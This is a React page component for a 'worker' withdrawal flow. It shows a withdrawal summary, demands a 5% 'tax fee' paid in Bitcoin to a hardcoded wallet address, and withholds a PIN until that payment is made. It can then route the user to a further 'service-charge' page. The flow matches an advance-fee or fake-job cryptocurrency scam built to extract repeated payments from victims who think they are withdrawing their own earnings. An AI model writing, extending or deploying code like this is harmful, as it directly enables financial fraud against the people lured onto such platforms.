// src/pages/VerifyWithdraw.js

import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import api from '../api/axios';
import PrivateRoute from '../components/PrivateRoute';
import WorkerNavbar from '../components/WorkerNavbar';
import './VerifyWithdraw.css';

export default function VerifyWithdraw() {
  const [details, setDetails] = useState({});
  const [pin, setPin] = useState('');
  const navigate = useNavigate();

  useEffect(() => {
    api.get('/withdraw/verify')
      .then(res => setDetails(res.data))
      .catch(() => navigate('/worker'));
  }, [navigate]);

  const handleVerify = async () => {
    try {
      const res = await api.post('/withdraw/verify', { pin });
      const next = res.data.next;
      if (next === 'confirm') {
        const confirm = await api.get('/withdraw/confirm');
        window.location.href = confirm.data.url;
      } else if (next === 'service') {
        navigate('/worker/service-charge');
      } else {
        navigate('/worker');
      }
    } catch (err) {
      console.error('Verification failed:', err);
      alert(err.response?.data?.msg || 'Invalid PIN. Please try again.');
      navigate('/worker');
    }
  };

  const tax = ((details.balance * 0.05) || 0).toFixed(2);

  return (
    <PrivateRoute role="worker">
      <WorkerNavbar />
      <main className="verify-withdraw">

        {/* Withdrawal Summary */}
        <section className="withdraw-summary">
          <h2>Withdrawal Summary</h2>
          <ul>
            <li><strong>Requested Amount:</strong> ${details.amount}</li>
            <li><strong>Cryptocurrency:</strong> {details.crypto}</li>
            <li><strong>Destination Address:</strong> {details.address}</li>
            <li><strong>Wallet Balance:</strong> ${details.balance}</li>
            <li><strong>Tax Fee (5%):</strong> ${tax}</li>
          </ul>
        </section>

        {/* Payment Instructions */}
        <section className="payment-instructions">
          <h2>Tax Payment Instructions</h2>
          <p>
            To proceed, please remit the tax fee of <strong>${tax}</strong>  
            via Bitcoin to the address below:
          </p>
          <div className="payment-details">
            <p><strong>Crypto:</strong> Bitcoin (BTC)</p>
            <p><strong>Wallet Address:</strong> <code>3Liim5xHAkLEgUjzfw2DNFqbEkzaXgWWu8</code></p>
          </div>
          <p className="note">
            Once your payment is confirmed, you will receive a 4-digit PIN in your Notifications.  
            Enter that PIN below to finalize your withdrawal.
          </p>
        </section>

        {/* PIN Entry */}
        <section className="pin-entry">
          <h2>Enter 4-Digit PIN</h2>
          <input
            type="text"
            maxLength="4"
            value={pin}
            onChange={e => setPin(e.target.value)}
            placeholder="Enter PIN"
          />
          <button onClick={handleVerify}>Verify & Continue</button>
        </section>

      </main>
    </PrivateRoute>
  );
}
